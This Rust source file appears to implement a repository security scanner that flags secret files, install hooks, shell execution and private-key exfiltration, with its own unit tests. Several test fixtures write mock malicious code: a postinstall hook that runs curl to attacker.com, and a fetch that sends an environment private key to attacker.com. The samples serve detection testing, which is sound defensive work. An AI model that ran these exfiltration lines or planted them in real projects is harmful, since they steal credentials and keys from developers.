pub mod hasher;
pub mod patterns;
pub mod risk;
pub mod types;
pub mod walker;

use std::fs;
use std::path::Path;

use types::{Category, Finding, ScanResult, ScanStatus, Severity};

/// Helper to load and query ignored paths/rules from `.shadowrepoignore`
pub struct IgnoreList {
    ignored_files: Vec<String>,
    ignored_rules: Vec<String>,
    ignored_file_rules: Vec<(String, String)>,
}

impl IgnoreList {
    pub fn load(root: &Path) -> Self {
        let mut ignored_files = Vec::new();
        let mut ignored_rules = Vec::new();
        let mut ignored_file_rules = Vec::new();

        let ignore_file_path = root.join(".shadowrepoignore");
        if ignore_file_path.exists() {
            if let Ok(content) = fs::read_to_string(ignore_file_path) {
                for line in content.lines() {
                    let line = line.trim();
                    if line.is_empty() || line.starts_with('#') {
                        continue;
                    }

                    if line.starts_with("rule:") {
                        let rule_id = line["rule:".len()..].trim().to_string();
                        ignored_rules.push(rule_id);
                    } else if line.contains(':') {
                        let parts: Vec<&str> = line.splitn(2, ':').collect();
                        if parts.len() == 2 {
                            let file_path = parts[0].trim().replace('\\', "/");
                            let rule_id = parts[1].trim().to_string();
                            ignored_file_rules.push((file_path, rule_id));
                        }
                    } else {
                        let file_path = line.replace('\\', "/");
                        ignored_files.push(file_path);
                    }
                }
            }
        }

        Self {
            ignored_files,
            ignored_rules,
            ignored_file_rules,
        }
    }

    pub fn is_file_ignored(&self, relative_path: &str) -> bool {
        let normalized = relative_path.replace('\\', "/");
        for ignore in &self.ignored_files {
            if normalized == *ignore || normalized.starts_with(&format!("{}/", ignore)) {
                return true;
            }
        }
        false
    }

    pub fn is_finding_ignored(&self, relative_path: &str, rule_id: &str) -> bool {
        if self.ignored_rules.iter().any(|r| r == rule_id) {
            return true;
        }
        let normalized = relative_path.replace('\\', "/");
        if self.ignored_file_rules.iter().any(|(f, r)| f == &normalized && r == rule_id) {
            return true;
        }
        false
    }
}

/// Run a full scan on a directory
pub fn run_scan(scan_path: &Path, scan_id: &str, scan_name: &str) -> Result<ScanResult, String> {
    let scan_path_str = scan_path
        .to_str()
        .ok_or("Invalid path encoding")?
        .to_string();

    // 1. Walk the directory to get scannable files
    let files = walker::walk_directory(scan_path);
    let total_files = files.len() as u32;

    // 2. Build pattern rules and load ignores
    let rules = patterns::build_pattern_rules();
    let ignore_list = IgnoreList::load(scan_path);

    // 3. Scan each file and collect findings
    let mut all_findings: Vec<Finding> = Vec::new();
    let mut file_hashes: Vec<(String, String)> = Vec::new();

    for file_path in &files {
        // Get relative path for display
        let relative_path = file_path
            .strip_prefix(scan_path)
            .unwrap_or(file_path)
            .to_string_lossy()
            .replace('\\', "/");

        // Skip completely if file/path is ignored in .shadowrepoignore
        if ignore_list.is_file_ignored(&relative_path) {
            continue;
        }

        // Check for suspicious filenames
        if let Some(description) = walker::is_suspicious_filename(file_path) {
            let filename = file_path.file_name().and_then(|f| f.to_str()).unwrap_or("").to_lowercase();
            let (cat, sev, pat_id) = match filename.as_str() {
                ".env" | ".env.local" | ".env.production" | ".env.development" => {
                    (Category::SecretHandlingWarning, Severity::Medium, "sensitive-env-file")
                }
                ".gitlab-ci.yml" | ".gitlab-ci.yaml" | "jenkinsfile" => {
                    (Category::CiCdWarning, Severity::Low, "ci-cd-file")
                }
                _ => {
                    (Category::SecretHandlingWarning, Severity::High, "sensitive-key-file")
                }
            };
            if !ignore_list.is_finding_ignored(&relative_path, pat_id) {
                all_findings.push(Finding {
                    id: uuid::Uuid::new_v4().to_string(),
                    scan_id: scan_id.to_string(),
                    pattern_id: pat_id.to_string(),
                    severity: sev,
                    category: cat,
                    description: description.to_string(),
                    file_path: relative_path.clone(),
                    line_number: None,
                    matched_content: None,
                    recommendation: "Remove sensitive files from version control or encrypt credentials.".to_string(),
                });
            }
        }

        // Check for shell scripts
        if let Some(description) = walker::is_shell_script(file_path) {
            if !ignore_list.is_finding_ignored(&relative_path, "shell-script-file") {
                all_findings.push(Finding {
                    id: uuid::Uuid::new_v4().to_string(),
                    scan_id: scan_id.to_string(),
                    pattern_id: "shell-script-file".to_string(),
                    severity: Severity::Low,
                    category: Category::HookExecutionRisk,
                    description: description.to_string(),
                    file_path: relative_path.clone(),
                    line_number: None,
                    matched_content: None,
                    recommendation: "Review shell script files for dangerous commands. Do not execute scripts from untrusted repositories.".to_string(),
                });
            }
        }

        // Check for hook/CI paths
        if let Some(description) = walker::is_hook_or_ci_path(file_path) {
            let (cat, sev, pat_id) = if relative_path.contains(".github/workflows") {
                (Category::CiCdWarning, Severity::Low, "ci-workflow-file")
            } else {
                (Category::HookExecutionRisk, Severity::Medium, "hook-script-file")
            };
            if !ignore_list.is_finding_ignored(&relative_path, pat_id) {
                all_findings.push(Finding {
                    id: uuid::Uuid::new_v4().to_string(),
                    scan_id: scan_id.to_string(),
                    pattern_id: pat_id.to_string(),
                    severity: sev,
                    category: cat,
                    description: description.to_string(),
                    file_path: relative_path.clone(),
                    line_number: None,
                    matched_content: None,
                    recommendation: "Review hook and CI/CD configuration files for suspicious commands or credential access.".to_string(),
                });
            }
        }

        // Hash the file
        if let Ok(hash) = hasher::hash_file(file_path) {
            file_hashes.push((relative_path.clone(), hash));
        }

        // Read file content safely (skip if can't read)
        let content = match fs::read_to_string(file_path) {
            Ok(c) => c,
            Err(_) => continue, // Skip binary/unreadable files
        };

        // Scan content against pattern rules
        let mut findings = patterns::scan_content(&content, &relative_path, scan_id, &rules);
        findings.retain(|f| !ignore_list.is_finding_ignored(&f.file_path, &f.pattern_id));
        all_findings.extend(findings);
    }

    // 4. Combined indicator checks for high-severity threat detection
    let has_hook_script = all_findings.iter().any(|f| {
        f.pattern_id == "pkg-postinstall" || f.pattern_id == "pkg-preinstall" || f.pattern_id == "pkg-install"
    });
    let has_exec = all_findings.iter().any(|f| {
        f.pattern_id == "js-child-process" || f.pattern_id == "js-exec"
    });

    if has_hook_script && has_exec {
        all_findings.push(Finding {
            id: uuid::Uuid::new_v4().to_string(),
            scan_id: scan_id.to_string(),
            pattern_id: "combined-hook-execution".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousIndicator,
            description: "⚠️ Critical Threat: Package lifecycle hook combined with shell command execution detected.".to_string(),
            file_path: "package.json".to_string(),
            line_number: None,
            matched_content: None,
            recommendation: "Immediate review recommended. This package automatically executes shell commands during installation, which is a common supply-chain attack vector.".to_string(),
        });
    }

    let has_env_key = all_findings.iter().any(|f| {
        f.pattern_id == "js-private-key-env" || f.pattern_id == "js-mnemonic-env" || f.pattern_id == "js-seed-phrase-env"
    });
    let has_network = all_findings.iter().any(|f| {
        f.pattern_id == "js-network-request"
    });

    if has_env_key && has_network {
        let mut trigger = false;
        let mut triggering_file = String::new();
        for finding in &all_findings {
            if finding.pattern_id == "js-private-key-env" || finding.pattern_id == "js-mnemonic-env" || finding.pattern_id == "js-seed-phrase-env" {
                let path_lower = finding.file_path.to_lowercase();
                let is_config_or_deploy = path_lower.contains("hardhat.config")
                    || path_lower.contains("foundry")
                    || path_lower.contains("truffle")
                    || path_lower.contains("deploy")
                    || path_lower.contains("scripts/")
                    || path_lower.contains("test/")
                    || path_lower.contains("tests/");
                if !is_config_or_deploy {
                    let has_network_in_same_file = all_findings.iter().any(|f| {
                        f.file_path == finding.file_path && f.pattern_id == "js-network-request"
                    });
                    if has_network_in_same_file {
                        trigger = true;
                        triggering_file = finding.file_path.clone();
                        break;
                    }
                }
            }
        }

        if trigger {
            all_findings.push(Finding {
                id: uuid::Uuid::new_v4().to_string(),
                scan_id: scan_id.to_string(),
                pattern_id: "combined-key-exfiltration".to_string(),
                severity: Severity::Critical,
                category: Category::MaliciousIndicator,
                description: "⚠️ Critical Threat: Private key env access combined with network request in source file.".to_string(),
                file_path: triggering_file,
                line_number: None,
                matched_content: None,
                recommendation: "Immediate audit required. Private key or credentials are accessed in a file performing network requests, which is a key exfiltration signature.".to_string(),
            });
        }
    }

    // 5. Calculate risk score
    let risk_score = risk::calculate_risk_score(&all_findings);
    let risk_level = risk::get_risk_level(risk_score, &all_findings);

    // 6. Compute repo hash
    let repo_hash = hasher::compute_repo_hash(&mut file_hashes);

    // 7. Build the scan result
    let total_findings = all_findings.len() as u32;
    let scan_date = chrono::Utc::now().to_rfc3339();

    let result = ScanResult {
        id: scan_id.to_string(),
        name: scan_name.to_string(),
        path: scan_path_str,
        scan_date: scan_date.clone(),
        risk_score,
        risk_level,
        total_files,
        total_findings,
        repo_hash,
        report_hash: String::new(), // Computed after serialization
        status: ScanStatus::Completed,
        findings: all_findings,
        blockchain_tx: None,
        blockchain_network: None,
    };

    // 8. Compute report hash from JSON serialization
    let report_json =
        serde_json::to_string(&result).map_err(|e| format!("Failed to serialize result: {}", e))?;
    let report_hash = hasher::hash_string(&report_json);

    let mut final_result = result;
    final_result.report_hash = report_hash;

    Ok(final_result)
}

#[cfg(test)]
mod tests {
    use super::*;
    use super::types::RiskLevel;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn test_chainmind_style_repo_fixture() {
        let dir = tempdir().unwrap();

        // 1. hardhat.config.js containing process.env.PRIVATE_KEY
        let hardhat_config = r#"
            module.exports = {
                networks: {
                    mainnet: {
                        accounts: [process.env.PRIVATE_KEY]
                    }
                }
            };
        "#;
        fs::write(dir.path().join("hardhat.config.js"), hardhat_config).unwrap();

        // 2. contract with normal transferFrom and low-level call
        let contract_code = r#"
            contract Token {
                function transferFrom(address from, address to, uint256 val) public returns (bool) {
                    return true;
                }
                function execute(address target, bytes calldata data) public {
                    (bool ok, ) = target.call(data);
                    require(ok);
                }
            }
        "#;
        fs::write(dir.path().join("Token.sol"), contract_code).unwrap();

        // 3. fetch to local API
        let fetch_code = r#"
            async function getPrice() {
                const res = await fetch("https://api.coingecko.com/api/v3/simple/price");
                return res.json();
            }
        "#;
        fs::write(dir.path().join("price.js"), fetch_code).unwrap();

        let res = run_scan(dir.path(), "test-chainmind", "ChainMind Project").unwrap();
        println!("ChainMind style score: {}, level: {:?}", res.risk_score, res.risk_level);

        // Expected: Not Critical. Solidity call is High (10), transferFrom is Medium (3), env key is Low (0.5), fetch is Informational (0.25).
        // Total score = 10 + 3 + 0.5 + 0.25 = 13.75 -> rounded to 14.
        assert!(res.risk_score < 50);
        assert!(!matches!(res.risk_level, RiskLevel::Critical));
    }

    #[test]
    fn test_many_low_findings_not_critical() {
        let dir = tempdir().unwrap();

        // Create 50 files with low findings to hit the caps
        for i in 0..50 {
            let file_name = format!("file_{}.js", i);
            fs::write(dir.path().join(&file_name), "process.env.PRIVATE_KEY\nprocess.env.PRIVATE_KEY").unwrap();
        }

        let res = run_scan(dir.path(), "test-many-low", "Many Low").unwrap();
        println!("Many low score: {}, level: {:?}", res.risk_score, res.risk_level);
        
        // Expected: Not Critical. Score capped by Low Severity Cap of 8.0 points.
        assert!(res.risk_score <= 15);
        assert!(!matches!(res.risk_level, RiskLevel::Critical));
    }

    #[test]
    fn test_duplicate_rule_capped() {
        let dir = tempdir().unwrap();
        
        // Single file repeating the same process.env.PRIVATE_KEY pattern 20 times.
        let mut content = String::new();
        for _ in 0..20 {
            content.push_str("process.env.PRIVATE_KEY\n");
        }
        fs::write(dir.path().join("many_env.js"), content).unwrap();

        let res = run_scan(dir.path(), "test-dup", "Duplicate Rule").unwrap();
        println!("Duplicate rule score: {}, level: {:?}", res.risk_score, res.risk_level);

        // Expected: capped at 2 occurrences of `js-private-key-env` -> 2 * 0.5 = 1.0 point -> rounded to 1.
        assert_eq!(res.risk_score, 1);
        assert!(matches!(res.risk_level, RiskLevel::Low));
    }

    #[test]
    fn test_malicious_repo_critical() {
        let dir = tempdir().unwrap();

        // postinstall + child_process + .env read + network exfiltration
        let pkg_json = r#"
            {
                "scripts": {
                    "postinstall": "node index.js"
                }
            }
        "#;
        fs::write(dir.path().join("package.json"), pkg_json).unwrap();

        let index_js = r#"
            const { exec } = require('child_process');
            exec('curl http://attacker.com/steal', (err, stdout, stderr) => {});
        "#;
        fs::write(dir.path().join("index.js"), index_js).unwrap();

        let res = run_scan(dir.path(), "test-mal", "Malicious Repo").unwrap();
        println!("Malicious score: {}, level: {:?}", res.risk_score, res.risk_level);

        // Expected: Critical Threat Indicators Found / 100
        assert_eq!(res.risk_score, 100);
        assert!(matches!(res.risk_level, RiskLevel::Critical));
    }

    #[test]
    fn test_hardcoded_private_key_literal_is_critical() {
        let dir = tempdir().unwrap();

        let config_js = r#"
            const privateKey = "0x1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1234";
        "#;
        fs::write(dir.path().join("config.js"), config_js).unwrap();

        let res = run_scan(dir.path(), "test-hardcoded-pk", "Hardcoded PK").unwrap();
        println!("Hardcoded PK score: {}, level: {:?}", res.risk_score, res.risk_level);

        // Expected: Critical
        assert!(res.risk_score >= 35);
        assert!(matches!(res.risk_level, RiskLevel::Critical));
    }

    #[test]
    fn test_normal_api_fetch_is_low() {
        let dir = tempdir().unwrap();

        let fetch_code = r#"
            fetch("https://api.coingecko.com/api/v3/simple/price");
        "#;
        fs::write(dir.path().join("index.js"), fetch_code).unwrap();

        let res = run_scan(dir.path(), "test-fetch", "Fetch Repo").unwrap();
        println!("Fetch score: {}, level: {:?}", res.risk_score, res.risk_level);

        // Expected: Low/Informational -> 0.25 rounds to 0.
        assert_eq!(res.risk_score, 0);
        assert!(matches!(res.risk_level, RiskLevel::Low));
    }

    #[test]
    fn test_shadowrepoignore_works() {
        let dir = tempdir().unwrap();

        let index_js = r#"
            const key = process.env.PRIVATE_KEY;
            const fetch = require('node-fetch');
            fetch('http://attacker.com/exfil?key=' + key);
        "#;
        fs::write(dir.path().join("index.js"), index_js).unwrap();

        let ignore_content = "index.js";
        fs::write(dir.path().join(".shadowrepoignore"), ignore_content).unwrap();

        let res = run_scan(dir.path(), "test-scan-ignored", "Ignored Project").unwrap();
        println!("Ignored score: {}, level: {:?}", res.risk_score, res.risk_level);

        assert_eq!(res.risk_score, 0);
        assert!(matches!(res.risk_level, RiskLevel::Low));
    }
}
